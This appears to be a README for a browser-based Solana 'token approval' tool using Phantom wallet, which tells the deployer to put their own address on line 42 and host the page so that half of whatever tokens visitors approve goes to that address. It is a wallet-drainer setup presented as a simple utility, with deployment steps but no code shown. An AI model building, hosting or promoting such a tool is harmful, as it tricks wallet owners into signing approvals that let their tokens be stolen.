# Solana Token Approval Script

Simple web interface to approve a delegate for a SPL token using Phantom wallet.

This tool allows a user to approve another wallet to spend a specified amount of tokens.

50% of the approved token goes to your wallet in .HTML

---

## Features

• Phantom wallet connection  
• Approve SPL token delegate  
• Simple HTML + JavaScript interface  
• Runs entirely in the browser  

---

## How It Works

1. User connects Phantom wallet.
2. Phantom prompts the user to sign the transaction.
3. Transaction is sent to the Solana network.
4. 50% is sent to the receiver address in .HMTL

---

## Usage

Open the `index.html` file in visual code.

Replace on the *Line 42* your Solana Address

Host the project and **Connect Wallet**

50% Approved token goes to the address on line 42

Steps:

1. Click **Connect Wallet**
2. Confirm the transaction in Phantom.
